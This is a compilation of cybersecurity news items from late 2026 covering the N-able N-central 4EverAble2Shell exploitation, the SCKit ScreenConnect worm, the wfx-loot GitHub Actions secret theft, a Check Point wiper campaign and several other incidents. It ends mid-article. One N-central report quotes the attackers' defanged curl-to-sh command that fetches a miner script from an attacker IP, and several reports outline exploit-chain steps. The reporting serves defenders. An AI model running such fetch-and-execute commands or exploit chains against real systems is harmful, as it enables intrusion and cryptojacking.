1yi45c4.text: Microsoft has confirmed that this month's Patch Tuesday security updates are causing Windows activation and licensing failures with 0x80041008 error codes. According to a Wednesday service alert seen by BleepingComputer, this known issue affects organizations that automate Windows activation and licensing processes or use the Software Licensing Management Tool (SLMGR) command-line tool. "Affected devices might encounter error 0x80041008, Invalid parameter (SWbemObjectEx), when running commands to activate Windows, configure Key Management Service (KMS), or manage product keys," Microsoft said. "Devices that are being configured to use KMS activation might encounter errors when attempting to initiate their activation. KMS-activated devices typically remain activated for up to 180 days following successful activation." The activation failures occur after executing the 'slmgr.vbs /skms-domain <domain>' and 'slmgr.vbs /ipk <key>' commands on client (Windows 10 21H2/22H2 and Windows 11 23H2) and server (Windows Server 2019/2022/2025) devices. However, Microsoft added that customers with the KMS client key installed in their image and who don't use SLMGR for licensing management are unaffected. "Devices that are already activated remain activated. Customers whose devices already have the appropriate KMS client key and KMS configuration, and who do not need to run the affected Slmgr.vbs commands, are not expected to be affected," the company noted. While a fix will be available over the coming days, Microsoft advised affected organizations that need immediate mitigation to reach out to Microsoft Support for business. In January, Microsoft addressed another known issue that was causing Windows license migration failures during upgrades because affected devices couldn't register with the Windows Activation server for digital licenses. This week, it also confirmed that the November 2026 Windows 11 security updates fail to install on systems with the October 2026 preview update and that Windows updates released since the October Patch Tuesday are triggering SQL Server performance and stability issues. 1le9gej.text: Authorities arrested 354 suspects in a joint international operation targeting vendors and buyers on the Archetyp, Nemesis, Tor2Door, Bohemia, and Kingdom dark web marketplaces. Codenamed 'Operation TorNado,' this law enforcement action ran from May 2025 to October 2026 and involved agencies from 14 countries. "Additionally, law enforcement targeted vendors and buyers active on forums, single-vendor shops, and encrypted messaging services. National authorities conducted independent investigations with Europol's support, including cross-checks via SIENA and forensic analysis," Europol said. "The operation highlighted the evolving resilience of dark web marketplaces, which continue to adapt despite takedowns." They seized over €60 million ($66 million) in cash and cryptocurrency, 950 kilograms of illicit drugs (including amphetamines, cocaine, ketamine, psilocybin mushrooms, MDMA, and cannabis), and 57 firearms in Europe. Law enforcement authorities also seized more than 4.8 metric tonnes of illicit drugs, 152 firearms, and over €150 million ($166 million) in the United States. "Following the takedown of multiple darknet marketplaces and vendor targets in the previous JCODE operation, U.S. and international law enforcement agencies obtained intelligence to identify Dark Web drug traffickers, resulting in a series of complementary, but separate, law enforcement investigations," the US Department of Justice added. "By leveraging complementary partnerships and surging resources across the U.S. government and Europol, Operation TorNado significantly disrupted the online opioid trade and sends a strong message that criminals operating on the Dark Web are not beyond the reach of law enforcement." Operation TorNado follows several similar actions over the last six years, including DisrupTor in 2020 (which led to 179 arrests) and Dark Huntor in 2021 (in which 150 more high-volume darknet vendors were apprehended). In April 2022, US authorities and German police also took down Hydra, the world's largest dark web marketplace at the time, with more than 19,000 seller accounts that were serving over 17 million customers worldwide. One year later, in 2023, Operation SpecTor led to the arrest of 288 other suspects who allegedly sold illicit drugs on dark web markets and the seizure of €50.8 million ($55.9 million) in cash and cryptocurrency. More recently, in May 2025, law enforcement also announced the arrest of another 270 dark web vendors and buyers from ten countries as part of Operation RapTor. zezu05.text: An unknown threat actor has been observed targeting unpatched Check Point Security Gateways to obtain initial access via the PHP2Shell vulnerabilities and then a previously unreported local privilege escalation flaw in Gaia OS to deploy a backdoor called TSGA. The activity, detailed by Check Point, began on October 30, 2026, and targeted Israeli organizations, with a broader follow-up wave on November 2, 2026, that targeted organizations across multiple countries and sectors. Some of the organizations singled out in the first wave have also been at the receiving end of destructive actions that include the deployment of wiper malware. "PHP2Shell provided initial access, followed by privilege escalation through the DynamicCLI interface, tracked as CVE-2026-123039," Check Point said. "The attackers then deployed PHP web shells, the persistent TSGA backdoor, and its embedded TSProxy networking component." "The attackers pivoted from the gateway to a VMware ESXi host over SSH, deployed the destroy_v6 wiper, and left politically themed DREAM_ANNEXATION.txt notes during the destructive stage." CVE-2026-123039 (CVSS score: 7.8) is a missing authorization flaw that could enable privilege escalation to root in the DynamicCLI process, enabling any authenticated local user to run arbitrary commands by writing a single request to the socket. "The issue is a local privilege escalation and requires the attacker to already have local code execution on the appliance," Check Point said, adding it "observed an active exploit of this vulnerability against a couple of dozen customers." The issue impacts versions R82.20, R82.10, R82, R81.20, R81.10, and R81 of the following products - Check Point Force Firewalls Check Point Management and Log Servers Multi-Domain Security Management and Multi-Domain Log Server Maestro Orchestrator "In late October 2026, approximately one week after a security fix became available, activity originating from 130.94.19[.]204 targeted Israeli organizations through vulnerable Mobile Access portals on Check Point Security Gateways," Check Point said. "Evidence suggested some cases of a successful compromise, with exploitation activity consistent with PHP2Shell, associated with CVE-2026-109618 and CVE-2026-109619." After obtaining initial access, the unknown hacking group is said to have escalated privileges from the portal service account to root by weaponizing CVE-2026-123039 and deploying PHP web shells with an aim to establish persistent access. The web shells support command execution and file upload capabilities. The November 2, 2026, wave is said to have targeted some Israeli organizations that had already been targeted in the first wave, alongside other organizations worldwide, without demonstrating any specific geographic or sector preference, indicating an opportunistic initial-access effort. The access afforded by the web shell paves the way for TSGA, a standalone passive backdoor that also includes a second component called TSProxy. TSGA, deployed as slot_CPconfigdaemon, has been described as a Linux gateway implant with Check Point-specific functionality, offering encrypted remote access, configuration theft, backup and snapshot persistence, process injection, and binary firewall-log tampering. "[TSProxy's] injection code loads this library into selected appliance processes, where it intercepts networking functions to handle specially marked attacker connections while allowing ordinary traffic to continue," Check Point said. "This combines a persistent standalone backdoor with concealed access through existing appliance services." Some of the other post-exploitation actions observed are listed below - Deploying the gogo scanner on the gateway to discover internal assets and services across the network. Moving laterally to a VMware ESXi host over SSH by authenticating with the vpxuser service account. Staging a Linux ELF wiper called destroy_v6 and executing it. The malware recursively traverses the target directory and deletes all files regardless of their extension. It also attempts to overwrite files with zeros before deleting them. Dropping a note named "DREAM_ANNEXATION.txt" in each processed directory. Both TSGA and TSProxy are assessed to be Check Point-specific components of a toolkit dubbed PhiliKit that was first documented by ESET in June 2026, attributing it to a China-nexus cyber espionage group tracked as Armory Castle (formerly UNC5221). Other factors that point to the involvement of a possible China-aligned threat actor include the use of LightNode VPS infrastructure and the fact that scanning activity was concentrated between 12 and 9 a.m. UTC, coinciding with typical Chinese working hours. However, the cybersecurity company said it does not have enough evidence to link the latest campaign to the threat actor or other known Chinese-nexus groups, citing the following reasons - Use of wiper malware Focus on Israel and explicit references to the Israeli-Palestine conflict in the wiper note "Taken together, the evidence does not allow us to assess with high confidence the true nature of this operation," Check Point said. "Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation. It is also possible that the destructive activity served as a smoke screen."

16yl43.text: Ravie LakshmananNov 13, 2026Vulnerability / Cyber Attack N-able on Thursday said it's taking additional precautions in the wake of public disclosure of a new set of flaws tracked as 4EverAble2Shell and Agent2Shell. "We are restricting certain N-central features and integrations," the company said in a Thursday update. "These measures may affect some functionality, but we believe taking additional precautions while remediation is completed is the right action to protect our partners and their customers." The following actions have been applied to Hosted environments - Legacy API is turned off by default in the product. Intune integration has been turned off while additional protections are implemented and validated. Hosted customers are also being recommended to follow N-able's previous guidance to upgrade Agents and Probes on N-central version 2026.4 HF1 and above, as the update introduces changes in how the Probe and Agent communicate. "N-able N-central 2026.4 HF1 updates legacy components of the Agent and Probe, which changes how the two communicate," it said. "As such, upgrading both Agents and Probes in your N-central server is a MUST to ensure all managed devices are communicating and patched." On-premises customers are being urged to upgrade Agents and Probes and ensure Legacy API access is disabled in the environment, if it has been previously turned on. "Our teams are actively assessing the new disclosures, developing additional remediation, and working to safely restore affected functionality," N-able said. "Protecting our partners and their customers remains our highest priority, and we will continue to take precautionary action where necessary." The development comes as independent security researcher Sean Bales disclosed two new sets of flaws called 4EverAble2Shell and Agent2Shell that work against the latest version of N-central and can allow attackers to execute arbitrary code as root and gain SYSTEM-level access to Windows systems under specific conditions. Multiple threat intelligence reports show that 4EverAble2Shell has moved beyond preliminary probing to active exploitation efforts, with threat actors leveraging it to deploy cryptocurrency miners on vulnerable servers. The attacks have been found to string together a critical Apache Axis vulnerability, tracked as CVE-2026-90436 (CVSS score: 9.8), with a separate N-central privilege escalation weakness to obtain root-level access. "An unauthenticated exploit chain in N-able N-central, disclosed as 4EverAble2Shell, is reported to allow remote attackers to execute arbitrary operating-system commands with root privileges," Previdian, which is tracking the flaw as VULN-2026-0009, said. "The chain exploits unsafe class instantiation during SOAP fault processing in the bundled Apache Axis component. A crafted request causes an attacker-selected JLine class to process malicious input, resulting in command execution as the nable service account." In an exploit chain detailed by the threat intelligence company, threat actors have been observed attempting to download and execute a shell script ("jup.sh") from an attacker-controlled server at "157.20.241[.]16," while sending back diagnostic information and command output to the server. Cybersecurity company Huntback has also revealed that the same IP address is weaponizing the 4EverAble2Shell flaw, deploying an XMRig Monero cryptocurrency miner on 21 N-central servers via the aforementioned shell script - mount -o remount,exec /tmp 2>/dev/null; curl -fsSL hxxp://157.20.241[.]16:8080/jup.sh | sh -s nc_[target-IP-redacted] The miner is designed to use only half of the available CPU cores, likely in an effort to fly under the radar. The compromised N-central servers are concentrated across the U.S., South Africa, Canada, the U.K., Germany, France, and Sweden. "The miner is the only payload we have seen, but the escalation hands the operator root on a host that manages your customers' endpoints," Huntback said. "Treat a hit as a full compromise, not a cleanup job. Applying Hotfix 2 is not enough on its own: 19 of the victims here were already running it."

152lnsf.text: A new worm-like malware toolkit named SCKit was deployed in the recent ScreenConnect attacks targeting managed service providers (MSPs), designed to spread from infected customer devices to MSP technicians' computers and compromise additional managed networks. The malware toolkit uses a worm-like technique that exploits a previously patched ScreenConnect vulnerability, CVE-2026-84869, to execute malicious code on a technician's workstation when they connect to an infected device. However, researchers at Huntress and Blackpoint Cyber say they have not observed successful exploitation of this flaw during the attacks, with Blackpoint confirming that the exploit failed in testing against a patched ScreenConnect client. The findings follow yesterday's widespread ScreenConnect attacks, in which attackers gained unauthorized access to cloud-hosted ScreenConnect environments and used the platform's Run Command feature to install rogue ScreenConnect remote-access clients on customer endpoints. ScreenConnect is a remote access and support platform used by MSPs and IT teams to remotely manage and troubleshoot customer devices. According to an updated Huntress report, the attacks compromised at least 288 endpoints across 48 organizations, with all of the affected devices targeted within 90 minutes. Approximately one-third of those systems were affected within the first 10 minutes. Huntress also believes the initial access was through RMM+, a third-party ScreenConnect extension that lets external management tools interact with ScreenConnect sessions without using the standard technician console. The researchers found that RMM+ versions 1.0.31 and 1.0.32 contained an authentication flaw that could allow attackers to execute commands without authenticating to ScreenConnect or completing multifactor authentication. RMM+ uses a shared access key to authenticate requests rather than ScreenConnect's normal user accounts and authentication mechanisms. However, the vulnerable versions allowed the access key to remain blank if an administrator had never configured one. When this occurred, an attacker could supply an empty access key and pass the extension's authentication check, allowing them to issue remote commands through the ScreenConnect environment. Huntress says this matches the activity observed during the attacks, where commands were executed across multiple ScreenConnect instances without corresponding user login activity, and logs linked the commands to RMM+. As part of its response, ConnectWise disabled five potentially related third-party extensions across approximately 400 partner environments. The company stressed that the presence of these extensions does not mean those environments were compromised. SCKit attempts to spread through ScreenConnect sessions In separate analyses, Huntress and Blackpoint Cyber examined SCKit, a collection of 16 scripts and components developed to establish persistent remote access and spread between systems managed through ScreenConnect. Blackpoint Cyber's Adversary Pursuit Group (APG) recovered the malware's loader directly from attacker-controlled infrastructure and decrypted subsequent stages to obtain the complete loader and a ScreenConnect installer used in the attacks. The attackers first deploy additional ScreenConnect Access clients configured to connect to servers under their control for persistent remote access even if the original MSP ScreenConnect session is terminated. However, SCKit's more novel capability is its attempt to turn a legitimate MSP remote support session into an attack against the technician initiating it. The toolkit includes a component called RelayTrap, which is designed to replace the legitimate ScreenConnect Guest process running on an infected endpoint and wait for an MSP technician to establish an interactive connection. Rather than dropping a precompiled executable, the attackers store RelayTrap as a C# source code file named RelayTrap.cs on their infrastructure. The source code is then downloaded to compromised devices, where a PowerShell script compiles it locally into an executable. A separate component called TrapWatch monitors ScreenConnect services and prepares the replacement Guest process to intercept incoming support sessions. When an MSP technician connects, RelayTrap attempts to send a malicious file in the opposite direction of a normal remote-support operation, from the infected customer endpoint to the technician's workstation. The technique attempts to exploit CVE-2026-84869, a critical ScreenConnect client-side file-transfer vulnerability that ConnectWise patched in version 26.6.5. Under normal circumstances, ScreenConnect allows technicians to send files to managed endpoints and execute them remotely. Instead, the vulnerability potentially allows a malicious Guest to send a file back to the technician and have it executed. The recovered source code also contains extensive comments explaining its functionality, compatibility workarounds, and previous coding errors, giving it the appearance of LLM-generated code. RelayTrap.cs source code contains unusually detailed comments describing its functionality Source: BleepingComputer Huntress also noted that RelayTrap appears to have been generated using a large language model. Once running on a technician's workstation, other SCKit components attempt to steal ScreenConnect authentication cookies from web browsers, which could allow attackers to hijack the technician's authenticated management session without requiring their credentials or a new MFA challenge. The malware then attempts to use the technician's existing ScreenConnect permissions to enumerate accessible endpoints and distribute malicious commands through legitimate management features, including the platform's Shared Toolbox. This creates a worm-like infection chain in which a compromised customer endpoint could infect an MSP technician's workstation, steal their management session, and use that access to compromise additional endpoints across other customer organizations. However, Huntress and Blackpoint Cyber have not seen this worm-like behavior succeeding during the current campaign. Blackpoint researchers Sam Decker and Nevan Beal told BleepingComputer that they reproduced the toolkit's attempted exploit against a current ScreenConnect client and found that the existing security fix prevented execution. "The Guest side queued the transfer, but the current client never requested or ran the payload," the researchers explained. "So we have confirmed what the toolkit is built to do, and we have no evidence of successful exploitation and no evidence of a bypass at this time." Huntress similarly reported that the console takeover attempt failed in every recovered host log it examined. MSPs are urged to disable the affected third-party extensions, update ScreenConnect clients, investigate unauthorized remote-access installations, and review Run Command and Toolbox activity for signs of compromise. Both research teams also recommend avoiding interactive ScreenConnect sessions with potentially infected endpoints and instead using separate security tools to investigate systems. slkbi2.text: Tens of thousands of GitHub repositories were targeted in a campaign dubbed ‘wfx-loot’ that uses malicious workflows to steal GitHub Actions secrets and cloud credentials. Although not all repositories ran the payload, researchers confirmed that the threat actor stole secrets from at least 1,835 targets. The threat actor used thousands of compromised GitHub accounts to open pull requests against repositories those accounts could access, testing whether they had sufficient write permissions to inject malicious code. Some of the compromised accounts belonged to Fortune 100 organizations, the US General Services Administration, the French government, Nextcloud, and WebdriverIO. According to researchers at application security company Aikido, about 50 of them appear to have publishing rights on other open-source software ecosystems and package indexes such as npm, PyPI, Go, crates, and Packagist. Attack details Aikido says the wfx-loot campaign began around 12:45 UTC on November 10, when the attacker used stolen GitHub credentials from 4,837 compromised accounts to probe 61,764 repositories for write access. The threat actor opened pull requests titled ‘docs: dependency audit notes,’ disguised as dependency audit notes. Of those pull requests, 92% remain open, Aikido reports, suggesting the legitimate repository owners did not notice the activity. Injected workflow step Source: Aikido They then delivered a 1,500-line credential-stealing shell script by modifying an existing GitHub Actions workflow, adding a new workflow on a short-lived branch, or planting an npm install hook. The script attempts to collect the following data: GitHub Actions and variables, the workflow’s GITHUB_TOKEN, OIDC, and Actions runtime tokens. Cloud credentials for AWS, Azure, and Google Cloud, including credentials exposed through instance metadata on self-hosted runners. Developer and infrastructure credentials from Git, SSH, GPG, Docker, Kubernetes, npm, PyPI, Vault, and Terraform. AI service and developer-tool credentials for OpenAI, Anthropic, Gemini, Hugging Face, Cursor, and GitHub Copilot. Other sources of secrets include environment variables, .env files, private keys, keystores, shell histories, process memory, repository files and recent commits, and workflow artifacts. The script also supports cloud privilege escalation by exchanging GitHub OIDC tokens for temporary AWS, Azure, and GCP cloud sessions. In AWS, it can chain into additional IAM (identity and access management) roles present in the repository "to create long-lived credentials for IAM users." It also uses collected service-account credentials to impersonate identities in GCP. Aikido notes that capabilities include establishing persistent access by creating long-lived credentials or modifying cloud identity and trust policies where permissions allow. The script compressed the collected data into tarballs and exfiltrated it via HTTP POST to one of two attacker-controlled endpoints. In the final stage, the attacker quickly reverted their changes and deleted workflow runs and logs. Aikido says this was completed in under a minute. Automated publishing carried the payload into Packagist’s digitalelvis/neuronai-studio 3.14.3 and two versions of the Go module github.com/onuragtas/docker-env, v1.0.278 and v1.0.280. The researchers believe the threat actor's primary objective was to steal CI secrets, while the package releases were a byproduct of automated publishing. The researchers also found certain overlaps with the 2025 GhostAction campaign. Repository owners are advised to look for the ‘wfx-docs’ branch, the probe pull request, and gaps in workflow run numbers. Where payload execution is confirmed, all secrets and cloud roles available to the affected workflows should be considered compromised and rotated immediately. 1v3hojh.text: Microsoft is investigating a widespread outage affecting multiple Microsoft 365 services, including Outlook, Microsoft Teams, and Copilot, as users report connectivity problems worldwide. BleepingComputer has received numerous reports from users experiencing problems accessing Microsoft's services, including complaints that Outlook is down. According to Downdetector, which tracks user-submitted outage reports, complaints surged Thursday afternoon across numerous Microsoft services, including Outlook, Microsoft 365, Teams, Copilot, Azure, OneDrive, and the Microsoft Store. In a Microsoft 365 admin center advisory tracked as MO1550821, Microsoft confirmed that customers may be unable to connect to multiple services, including Exchange Online, Microsoft Teams, SharePoint Online, Microsoft 365 Copilot, and Microsoft Defender XDR. The company says the Microsoft 365 incident began Thursday at 1:26 PM ET, although it began investigating reports of Exchange Online mailbox connectivity problems in the Americas earlier in the day. Microsoft initially attributed the disruption to elevated infrastructure load across multiple regions, but has determined that the problem was caused by servers unexpectedly becoming unavailable. "We determined the elevated load isn't driven by an increase in traffic, but by a number of servers being unexpectedly unavailable; straining the remaining infrastructure. We're working to safely return them to service," Microsoft said in an update on X. The company says it has paused all deployments, redistributed connection traffic across its worldwide infrastructure, and is moving additional traffic away from affected systems to reduce load. Microsoft is also restarting affected servers to restore capacity and return services to normal operation. While the company initially reported Exchange Online connectivity problems in the Americas, it later confirmed that users in any region could be affected. The outage follows a separate Microsoft Teams incident earlier Thursday that caused an outage for users in North and South America. That earlier incident, tracked as TM1550488, lasted from 9:45 AM to 10:53 AM ET and caused delays or failures when sending messages, errors creating or updating conversations, and problems retrieving chat messages. Microsoft attributed the earlier Teams disruption to resource contention within its infrastructure, which led to elevated resource utilization and prevented the service from processing messaging requests normally. The company says the earlier Teams incident has been fully resolved. Microsoft has not indicated whether the two incidents are related, and the ongoing Microsoft 365 outage has not yet been resolved. 1bx2dlq.text: Hackers are actively exploiting a newly disclosed N-able N-central zero-day vulnerability dubbed "4EverAble2Shell" to compromise servers and deploy cryptocurrency miners, with researchers reporting at least 21 affected systems, including 19 running the company's latest security update. The attacks follow security researcher Sean Bales' release of two new zero-day exploits today, dubbed 4EverAble2Shell and Agent2Shell, which he says allow attackers to gain root-level access to N-central appliances and SYSTEM-level access to Windows systems. N-central is a remote monitoring and management (RMM) platform used by managed service providers (MSPs) and IT teams to monitor, manage, and secure customer devices and networks remotely. The new vulnerabilities were disclosed on November 12, just two days after N-able released emergency security updates to address critical N-central zero-day vulnerabilities that Bales had publicly disclosed earlier this week. Bales published proof-of-concept exploits for both the 4EverAble2Shell and Agent2Shell vulnerabilities, saying they were tested against N-central Appliance 2026.4.1.26 HF2, the security update N-able released on November 10. The 4EverAble2Shell exploit allows unauthenticated attackers to execute commands as root on vulnerable N-central servers. However, the researcher says exploitation requires the platform's Legacy API functionality to be enabled. The attack combines an Apache Axis vulnerability, tracked as CVE-2026-90436, with a separate N-central privilege escalation weakness to gain root-level access. The second exploit, Agent2Shell, targets N-central's agent functionality and is claimed to allow attackers to execute commands with SYSTEM privileges on Windows devices. The disclosures came after N-able took its hosted N-central environments offline earlier this week and urged on-premises customers to shut down their servers after Bales published more than 30 alleged zero-day vulnerabilities. Bales has criticized N-able's handling of the vulnerability disclosures and the company's slow response to patching responsibly disclosed flaws. "It's much much easier for me to just release the research I have and the vendor can decide what they want to do with it, what they do and don't want to fix, etc. :)," Bales told BleepingComputer. Bales said N-able has not patched two unrelated RCE vulnerabilities in a different N-able product that he previously disclosed to the company in July. In a November 12 security advisory, N-able said it was implementing additional protections in response to the new disclosures, including restricting certain N-central features and integrations while it develops further fixes. "We are restricting certain N-central features and integrations," N-able said. "These measures may affect some functionality, but we believe taking additional precautions while remediation is completed is the right action to protect our partners and their customers." The company says it has disabled the Intune integration as a precaution and is urging on-premises customers to ensure Legacy API access is disabled, which is already the default. The protections have already been applied to hosted environments, but customers are also advised to continue upgrading their Agents and Probes under the previous Hotfix 2 guidance. In its advisory, N-able said it had seen no signs of compromise using the new flaws, although security researchers have since reported successful exploitation of the vulnerability against production N-central servers. Hackers already exploiting 4EverAble2Shell Cybersecurity company Previdian told BleepingComputer that attackers began probing for the 4EverAble2Shell vulnerability on November 12, shortly after the public release of the proof-of-concept exploit. The company first observed suspicious requests targeting its N-central honeypot at approximately 08:30 UTC, using the same Java class referenced in the publicly released exploit. While the initial requests were limited to probing for vulnerable servers, Previdian later confirmed that attackers were attempting to execute the complete exploit chain against its honeypot server. The attacks initially exploit Apache Axis CVE-2026-90436 to execute commands as the 'nable' service account, then exploit a separate N-central privilege escalation vulnerability to obtain root privileges. This attack chain matches the POC Bales released on GitHub. According to Previdian, the privilege escalation stage abuses N-central's privileged setLDFileOwner helper and a symbolic link to make a normally root-owned script writable. The attacker then modifies the script and invokes N-central's serverControl functionality to execute commands as root, while attempting to restore the modified files afterward. The payload attempted to download and execute an additional shell script from an attacker-controlled server at 157.20.241[.]16, while sending diagnostic information and command output back to the same IP address. Previdian is tracking the N-central privilege escalation flaw as VULN-2026-0009 and has added it to its own Known Exploited Vulnerabilities (KEV) catalog. Cybersecurity company Huntback also reports that attackers have already successfully compromised at least 21 production N-central servers using Bales' publicly released exploit chain. Huntback saw the same attacker IP address as Previdian probing its N-central honeypots at approximately 08:30 UTC on November 12, with the first attempts to execute the complete exploit chain beginning at 09:16 UTC. The attacks seen by Huntback exploited the 4EverAble2Shell exploit chain to download a shell script that installed an XMRig Monero cryptocurrency miner. The miner was configured to use about half of the available CPU cores, likely to make the mining harder to detect. Huntback identified other compromised systems through the attacker's cryptocurrency mining pool statistics, where infected systems were assigned identifiers beginning with nc_ followed by the server's IP address. At 12:50 UTC on November 12, the researchers found 21 active miners using this naming convention, all of which had submitted mining shares within the previous five minutes. The researchers then checked the associated IP addresses and confirmed that all 21 hosted N-central installations, including 19 running version 2026.4.1.26, the latest Hotfix 2 release issued on November 10. The compromised servers were located across multiple countries, including the United States, Canada, South Africa, the United Kingdom, Germany, France, and Sweden. While the attacks observed so far have been primarily used for cryptojacking, attackers could use compromised N-central infrastructure for additional malicious activity targeting managed customer environments. Organizations running N-central should ensure that Legacy APIs are disabled and investigate suspicious requests to /dms/services/ServerUI, especially those referencing jline.internal.TerminalLineSettings. Huntback also recommends checking for unexpected xvd.service systemd services, cryptocurrency mining processes, and files created under /tmp/.xvd or /var/tmp/.xvd. Because the 4EverAble2Shell attack grants full root access to exploited servers, organizations that detect these IOCs should treat the breach as a full compromise of the server. 5ccqaj.text: A critical vulnerability in the HTTP/2 module of Apache HTTP Server could be exploited by an unauthenticated attacker to obtain remote code execution (RCE). The Apache Software Foundation has fixed the issue, now tracked as CVE-2026-119618, but a significant number of servers are vulnerable and reachable over the public internet. Discovered by Anthropic’s OSS Scanner and Google Cloud’s Vulnerability Research teams, the vulnerability is a race condition in the mod_http2 module that can corrupt heap memory. An attacker successfully exploiting it could run code with the web server process’s privileges in HTTP Server versions 2.4.55 through 2.4.70, and standalone mod_h2 version 2.0.8 through 2.0.42. Apache describes the problem as “Concurrent Execution using Shared Resource with Improper Synchronization vulnerability in Apache HTTP Server's mod_http2 in assign_headers() can lead to RCE.” Apache HTTP Server is a free and open-source software that handles requests from web browsers and serves pages, images, and other website content. It is a widely used tool estimated to back roughly one out of five websites. According to telemetry data from cloud security company Wiz, 64% of the cloud environments have vulnerable resources, and roughly half of them have publicly exposed instances. However, the numbers do not account for server configuration, which requires HTTP/2 to be enabled (default is off). Researchers at cybersecurity company watchTowr confirmed this condition and recommend technicians to "patch now or drop h2 until you can." "Due to improper synchronization when executing concurrent threads sharing resources, an attacker can trigger heap corruption," Wiz researchers say. "This memory corruption can ultimately be leveraged to achieve RCE on the hosting server, allowing unauthorized threat actors to execute arbitrary commands with the privileges of the web server process." Wiz assesses the severity of the vulnerability to be critical, although no official score is available. The company says that it is currently unaware of any public exploits or attacks targeting the flaw, but this could change soon. The latest version of Apache HTTP Server also addresses two additional flaws, CVE-2026-106023 - a null pointer dereference in ‘mod_md,’ and CVE-2026-109163 - a low-severity data overwrite flaw in ‘mod_vhost_alias.’ Uncover email threats your existing defenses may miss. a4syni.text: Security teams have more alerts, logs, and monitoring tools than ever. Yet when an attack happens, one simple question can still take too long to answer: Who or what is behind this activity, and what can they access? A suspicious login might belong to an employee. An unusual API call could come from a machine account. Or an AI agent might be accessing sensitive systems using permissions nobody has reviewed recently. Your SIEM or EDR may catch the activity. But without knowing who owns that identity, what permissions it has, and which systems it can reach, your SOC is missing a critical part of the story. And that missing context can turn a manageable incident into a much bigger problem. Join this expert-led webinar to learn how real-time identity context can help your SOC investigate threats faster, understand what's at risk, and respond with confidence. The Blind Spot Between Identity and Security Operations Here's the problem. Identity and access management (IAM) teams know who has access to what. Security operations teams monitor suspicious activity and respond to threats. But these teams often work with different tools, different data, and different priorities. When an alert comes in, SOC analysts may know what happened but still struggle to understand what it means. Consider a compromised service account. An analyst might detect suspicious activity, but several questions remain: What applications and systems can this account access? Could an attacker use it to move deeper into the network? How much damage could it cause? Can the account be disabled without breaking a critical business process? These answers matter. Blocking the wrong identity can disrupt production. Waiting too long can give an attacker more room to move. And with machine identities and autonomous AI agents becoming part of everyday operations, the problem is getting more complicated. More Identities, More Access, More Risk Traditional security monitoring was largely built around users, devices, and network activity. Today, organizations also rely on service accounts, API keys, automated workloads, and AI agents that can act without direct human involvement. These identities often have access to important systems and data. If one is compromised, detecting the suspicious action is only the beginning. Security teams also need to understand its permissions, connections, and potential impact. That's where identity context changes the investigation. Instead of treating every alert as an isolated event, analysts can connect suspicious activity to the identity behind it, understand how far an attacker could move, and choose a response that limits damage without unnecessarily interrupting operations. What Does a Better SOC Response Actually Look Like? The goal isn't to add another dashboard or generate more alerts. It's to give analysts the information they need when an incident is unfolding. That means connecting identity intelligence with existing SIEM and EDR alerts, so teams can: Investigate faster: Understand which human, machine, or AI identity is involved. See the real risk: Identify permissions, connected systems, and potential lateral movement. Contain threats safely: Respond to compromised credentials without unnecessarily disrupting critical automation. Work better together: Give IAM and SOC teams shared workflows, clear escalation paths, and common response goals. The difference is simple: knowing that something suspicious happened is useful. Knowing what it can affect and how to stop it is far more valuable. Learn How to Close the Gap In the upcoming webinar, Fuel the SOC with Identity Context: Securing Humans, Machines, and AI Agents, security experts will explore how organizations can bring IAM and security operations together. Drawing on real-world enterprise deployments, the session will cover practical approaches to enriching security alerts with identity context, investigating lateral movement, understanding the potential blast radius of an attack, and improving incident response without disrupting production systems. It will also explain how teams can align around shared metrics, escalation processes, and response playbooks. Your SOC already has the alerts. Now give it the context to act. Register for the free webinar and learn how to turn identity intelligence into faster, smarter security response.

k5pode.text: A search result isn't always safe. An access request isn't always harmless. And a familiar account doesn't always mean a familiar person is using it. Simple things to remember. Yet a surprising amount of this week's trouble starts right there.Attackers are using fake websites, stolen access, and trusted tools to get into places they shouldn't be. AI is helping them build attacks faster, while also giving them new systems to target. Some intruders are staying hidden even after security holes are fixed. Others are moving stolen money through a maze of transactions. And researchers keep finding small coding mistakes that can cause much bigger problems. Different stories, but much of the trouble comes down to making something dangerous look normal.There is some good news, too. Criminal servers have been seized, and a few defenses are getting stronger. Still, plenty of things are going wrong in ways that shouldn't be this easy. Here's what turned up this week.The threats change every week. Subscribe, and we’ll alert you when each new ThreatsDay Bulletin is out. North Korea's crypto laundering network The North Korean threat actors linked to the record-breaking theft of $6.43 billion from Binance are using a highly complex and clearly automated method to launder the illicit proceeds. "Since the theft it has used more than 20,000 wallets on 16 blockchains, at least 36 services and at least 65,000 transactions," Dr. Tom Robinson, Elliptic's founder and chief scientist, said. "Around $3.0 billion remains in addresses linked to the theft, mostly as ETH and BTC. A negligible amount has likely been cashed out." The attackers have also been observed creating six meme coins on the NEAR blockchain network (FUK, OLCCL, MEILI, MMLI, DABI, and SINU) to launder a slice of the ill-gotten funds, passing through about $430,000 of the stolen cryptocurrency. The goal is to disguise the path of money and make it harder to trace where the assets eventually end up. Other tactics used to make funds tracing more difficult include moving between blockchains through bridges and cross-chain swap services, swapping between assets on DEXs, hopping through lending vaults and liquid-staking services, and mixing bitcoin through coinjoins, and ETH and SOL through the Privacy Cash privacy pool. The Binance breach is by no means the first to affect a major cryptocurrency exchange, but it is the biggest ever by magnitude. North Korean spokesperson Kim Yo Jong denied the country's role in the attack, calling it an "absurd" effort to "damage the international image of the DPRK." GSocket detections surge 356% Microsoft said it has observed multiple incidents in which threat actors deployed GSocket, an open-source remote access tool, on internet-facing Linux servers to maintain access after the original vulnerabilities were addressed, turning a single web application compromise into persistent access. "Because GSocket relays traffic through a shared public network, there is no threat actor-owned IP address or domain to block," Microsoft said. "Defenders should look for GSocket deployment, persistence, privilege escalation, and outbound connections on affected hosts, not treat application patching alone as complete remediation." According to telemetry data, devices with GSocket-related detections increased 356.2% from March through August 2026, with most of them associated with PHP web applications, cPanel hosts, and Apache. The majority of targets of GSocket activity are in the education and research sector, followed by technology and communications, manufacturing, and government entities. 235 servers seized in Europol takedown Europol, along with global partners, has disrupted the criminal infrastructure behind GootLoader, CastleRAT, and StealC malware, seizing 235 servers and 257 domains. "The operation targeted 'cybercrime-as-a-service' models, where these tools enabled further crimes like ransomware attacks and data theft," Europol said. As part of the operation, authorities have identified over 6 million victim credentials. "The suspects were using these credentials, stolen from the victims after they infected them, to sell them and later be used for other cyber-attacks such as ransomware," Europol added. Browser-based espionage targets governments A command and control (C2) framework called Falcon (aka XG or Xiàng Gē) has been found compromising victims' browsers by running malicious JavaScript. Falcon shares near-identical URL structures, payload delivery mechanisms and communication protocols with PeckBirdy, another JavaScript C2 framework that came to light early this year. It's assessed that Falcon and PeckBirdy represent variants of the 